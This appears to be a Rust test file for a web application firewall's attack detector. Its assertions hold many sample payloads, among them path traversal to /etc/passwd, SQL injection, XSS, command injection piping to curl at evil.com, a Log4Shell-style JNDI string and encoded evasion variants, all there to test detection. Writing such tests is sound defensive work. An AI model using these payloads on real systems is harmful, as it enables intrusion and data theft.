use super::*;
use crate::rule::Header;

#[test]
fn check_path_traversal_detects_traversal_patterns() {
    assert!(check_path_traversal(b"/app/static/../../etc/passwd").is_some());
    assert!(check_path_traversal(b"/api/%2e%2e/admin").is_some());
    assert!(check_path_traversal(b"/download?f=a%00.png").is_some());
    assert!(check_path_traversal(b"/safe/path/image.png").is_none());
}

#[test]
fn check_sqli_detects_injection_but_not_prose_or_content_negotiation() {
    assert!(check_sqli(b"admin' OR '1'='1").is_some());
    assert!(check_sqli(b"id=1 UNION SELECT null, username FROM users").is_some());
    assert!(check_sqli(b"q=x' and 1=1 order by 3 -- ").is_some());
    assert!(check_sqli(b"user=admin'--").is_some());
    assert!(check_sqli(b"name=JohnDoe").is_none());
    assert!(check_sqli(b"text/html,application/xml;q=0.9,*/*;q=0.8").is_none());
    assert!(check_sqli(b"please select a table from the menu").is_none());
    assert!(check_sqli(b"it's a group order from the shop").is_none());
    assert!(check_sqli(b"id=1 or 1=1").is_some());
    assert!(check_sqli(b"id=5 or b=2").is_none());
    assert!(check_sqli(b"I'd select the second option -- it's cheaper").is_none());
    assert!(check_sqli(b"name='x' union all from t--").is_some());
}

#[test]
fn check_xss_detects_script_injection_but_not_plain_markup_words() {
    assert!(check_xss(b"<script>alert(1)</script>").is_some());
    assert!(check_xss(b"<img src=x onerror=alert(1)>").is_some());
    assert!(check_xss(b"<svg/onload=alert(1)>").is_some());
    assert!(check_xss(b"<a href=\"javascript:alert(1)\">x</a>").is_some());
    assert!(check_xss(b"plain text input").is_none());
    assert!(check_xss(b"onboarding=1&alert(true)").is_none());
    assert!(check_xss(b"<div class=\"a\">hello</div>").is_none());
}

#[test]
fn check_rce_detects_command_injection_but_not_punctuation() {
    assert!(check_rce(b"127.0.0.1; /bin/sh").is_some());
    assert!(check_rce(b"input|curl http://evil.com").is_some());
    assert!(check_rce(b"x=$(cat /etc/hostname)").is_some());
    assert!(check_rce(b"host=a && whoami").is_some());
    assert!(check_rce(b"${jndi:ldap://x}").is_some());
    assert!(check_rce(b"status ok; done | next").is_none());
    assert!(check_rce(b"a=1&b=2&c=3").is_none());
}

#[test]
fn inspect_text_blocks_obfuscated_waf_evasion_attacks() {
    assert!(inspect_text(b"id=%27%20or%20%271%27=%271").is_some());
    assert!(inspect_text(b"1'/**/UnIoN/**/SeLeCt/**/1").is_some());
    assert!(inspect_text(b"/api/%252e%252e/%252e%252e/etc/passwd").is_some());
    assert!(inspect_text(b"<img%20src=x%20onerror=alert(1)>").is_some());
}

#[test]
fn automaton_and_sequential_scans_agree_on_every_signature() {
    let signatures = Signatures::new();
    for category in AttackCategory::ALL {
        for pattern in table(category) {
            let text = format!("prefix {pattern} suffix");
            let fast = inspect_text_with(&signatures, text.as_bytes()).unwrap();
            let slow = inspect_text(text.as_bytes()).unwrap();
            assert_eq!(fast.category, slow.category, "{pattern}");
        }
    }
}

#[test]
fn signature_tables_hold_no_duplicates_under_case_folding() {
    // The Zig automaton kept the last of two equal patterns and the Rust one keeps the
    // first; with no duplicates both report the same signature.
    let mut seen = std::collections::HashSet::new();
    for category in AttackCategory::ALL {
        for pattern in table(category) {
            assert!(seen.insert(pattern.to_ascii_lowercase()), "{pattern}");
        }
    }
}

#[test]
fn inspect_request_passes_a_real_browser_request_untouched() {
    let signatures = Signatures::new();
    let headers = [
        Header { name: b"Host", value: b"example.com" },
        Header {
            name: b"Accept",
            value: b"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\
                */*;q=0.8",
        },
        Header { name: b"Accept-Language", value: b"en-US,en;q=0.5" },
        Header { name: b"Accept-Encoding", value: b"gzip, deflate, br" },
        Header { name: b"Cookie", value: b"session=abc--def; theme=dark" },
        Header { name: b"Referer", value: b"https://example.com/blog?tag=c%2B%2B" },
        Header { name: b"Sec-Ch-Ua", value: b"\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\"" },
    ];
    let ua = b"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like \
        Gecko) Chrome/128.0.0.0 Safari/537.36";
    let body = b"{\"comment\":\"I'd select the second option -- it's cheaper\"}";
    let request = RequestView {
        path: b"/blog/post-1",
        query: b"tag=c%2B%2B&page=2",
        user_agent: ua,
        headers: &headers,
        body,
        ..RequestView::default()
    };
    assert_eq!(inspect_request(&signatures, &request), None);
}

#[test]
fn inspect_request_still_catches_attacks_in_custom_headers_and_bodies() {
    let signatures = Signatures::new();
    let headers = [Header { name: b"X-Query", value: b"<script>alert(1)</script>" }];
    let request = RequestView { path: b"/search", headers: &headers, ..RequestView::default() };
    assert_eq!(inspect_request(&signatures, &request).unwrap().category, AttackCategory::Xss);
    let request =
        RequestView { path: b"/submit", body: b"cmd=test; /bin/sh", ..RequestView::default() };
    assert_eq!(inspect_request(&signatures, &request).unwrap().category, AttackCategory::Rce);
    let request = RequestView {
        path: b"/search",
        query: b"q=1%27%20union%20select%20null--",
        ..RequestView::default()
    };
    assert_eq!(inspect_request(&signatures, &request).unwrap().category, AttackCategory::Sqli);
}

#[test]
fn encoded_payload_after_two_kilobytes_is_canonicalised() {
    let mut payload = vec![b'a'; 4096];
    let attack = b"%3Cscript%3Ealert(1)%3C/script%3E";
    payload[3000..3000 + attack.len()].copy_from_slice(attack);
    assert!(inspect_text(&payload).is_some());
    assert!(inspect_text_with(&Signatures::new(), &payload).is_some());
}

#[test]
fn category_inspection_agrees_with_full_inspection_on_the_winning_category() {
    let signatures = Signatures::new();
    let samples: [&[u8]; 8] = [
        b"1'/**/UnIoN/**/SeLeCt/**/1",
        b"/x/../etc/passwd",
        b"<img%20src=x%20onerror=alert(1)>",
        b"a; wget http://x",
        b"id=1 or 1=1",
        b"plain",
        b"%00",
        b"a=1&id=5",
    ];
    for sample in samples {
        let full = inspect_text_with(&signatures, sample);
        if let Some(violation) = full {
            let single = inspect_category(&signatures, violation.category, sample);
            assert!(single.is_some(), "{sample:?}");
        } else {
            for category in AttackCategory::ALL {
                assert_eq!(inspect_category(&signatures, category, sample), None, "{sample:?}");
            }
        }
    }
}

#[test]
fn structural_headers_are_recognised_without_case() {
    assert!(is_structural_header(b"ACCEPT"));
    assert!(is_structural_header(b"Sec-Fetch-Mode"));
    assert!(!is_structural_header(b"Cookie"));
    assert!(!is_structural_header(b"User-Agent"));
}

#[test]
#[ignore]
fn component_timing() {
    let filler = b"the quick brown fox jumps over the lazy dog, and the form holds a note. ";
    let body: Vec<u8> = (0..8192).map(|i| filler[i % filler.len()]).collect();
    let signatures = Signatures::new();
    let time = |name: &str, f: &dyn Fn() -> usize| {
        let start = std::time::Instant::now();
        let mut sink = 0;
        for _ in 0..2000 {
            sink += f();
        }
        println!("{name}: {:.1} ns ({sink})", start.elapsed().as_nanos() as f64 / 2000.0);
    };
    time("classes", &|| usize::from(scan(std::hint::black_box(&body)).needs_canonical()));
    time("automaton", &|| {
        usize::from(signatures.find_first(std::hint::black_box(&body)).is_some())
    });
    time("tags", &|| usize::from(signatures.categories(std::hint::black_box(&body))));
    time("full", &|| {
        usize::from(inspect_text_with(&signatures, std::hint::black_box(&body)).is_some())
    });
}
